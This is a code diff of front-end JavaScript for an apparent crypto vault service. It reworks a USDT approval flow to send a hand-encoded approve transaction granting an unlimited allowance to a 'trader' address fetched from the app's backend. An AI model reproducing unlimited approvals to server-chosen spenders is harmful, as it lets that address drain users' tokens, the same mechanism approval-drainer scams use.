@@ -1166,33 +1166,81 @@ async function wfDoApprove() {
   msgEl.style.color = '#58a6ff';
 
   try {
-    var usdtContract = new ethers.Contract(wfUsdtAddr, [
-      'function approve(address spender, uint256 amount) returns (bool)'
-    ], wfSigner);
+    // 检查 trader 地址
+    if (!wfTraderAddr) {
+      // 重新获取 trader 地址
+      var tk = getToken();
+      var resp = await fetch('/api/vault/approve-params', { headers: { 'Authorization': 'Bearer ' + tk } });
+      var data = await resp.json();
+      if (data.success) { wfTraderAddr = data.traderAddress; wfUsdtAddr = data.usdtAddress; }
+    }
+    if (!wfTraderAddr) { wfShowMsg('获取授权地址失败，请刷新重试', '#f85149'); btn.disabled = false; btn.textContent = '授权 USDT'; wfShowStep(2); return; }
 
-    var tx = await usdtContract.approve(wfTraderAddr, ethers.MaxUint256);
+    // 获取当前钱包地址
+    var addr = await wfSigner.getAddress();
 
-    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>交易已发送，等待确认...';
+    // 用原生 eth_sendTransaction 发送 approve 交易
+    // approve(address spender, uint256 amount) = 0x095ea7b3
+    // spender = wfTraderAddr (32 bytes padded)
+    // amount = MaxUint256 (32 bytes)
+    var spenderPadded = wfTraderAddr.toLowerCase().replace('0x','').padStart(64,'0');
+    var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    var approveData = '0x095ea7b3' + spenderPadded + maxUint;
 
-    var receipt = await tx.wait();
+    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>请在钱包中确认授权...';
 
-    if (receipt.status === 1) {
+    var txHash = await window.ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: addr,
+        to: wfUsdtAddr,
+        data: approveData
+        // 不传 gas/gasPrice — 让钱包自动估算
+      }]
+    });
+
+    msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#58a6ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>交易已发送: ' + txHash.substring(0,18) + '...<br>等待链上确认...';
+    msgEl.style.color = '#58a6ff';
+
+    // 轮询交易收据
+    var receipt = null;
+    for (var i = 0; i < 60; i++) {
+      try {
+        receipt = await window.ethereum.request({ method: 'eth_getTransactionReceipt', params: [txHash] });
+        if (receipt) break;
+      } catch(e) {}
+      await new Promise(function(r){ setTimeout(r, 3000); });
+    }
+
+    if (!receipt) {
+      msgEl.innerHTML = '⏳ 交易已发送，确认中...<br>Hash: ' + txHash.substring(0,18) + '...<br>请稍后在仪表盘查看状态';
+      msgEl.style.color = '#d29922';
+      // 仍然通知后端
+      var tk2 = getToken();
+      fetch('/api/vault/approve-confirmed', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk2 },
+        body: JSON.stringify({ txHash: txHash })
+      }).then(function() { setTimeout(function(){ refreshAll(); }, 2000); }).catch(function(){});
+      return;
+    }
+
+    if (receipt.status === '0x1' || receipt.status === 1) {
       msgEl.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid #30363d;border-top-color:#3fb950;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:6px"></span>授权成功！正在通知系统...';
       msgEl.style.color = '#3fb950';
 
       // 通知后端
-      var tk = getToken();
-      var resp = await fetch('/api/vault/approve-confirmed', {
+      var tk3 = getToken();
+      var resp2 = await fetch('/api/vault/approve-confirmed', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk },
-        body: JSON.stringify({ txHash: tx.hash })
+        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + tk3 },
+        body: JSON.stringify({ txHash: txHash })
       });
-      var data = await resp.json();
+      var data2 = await resp2.json();
 
-      if (data.success) {
+      if (data2.success) {
         msgEl.innerHTML = '✅ 授权成功！盖茨费系统已激活';
         msgEl.style.color = '#3fb950';
-        // 刷新仪表盘
         setTimeout(function() { refreshAll(); }, 2000);
       } else {
         msgEl.innerHTML = '✅ 链上授权成功，系统确认稍后自动完成';
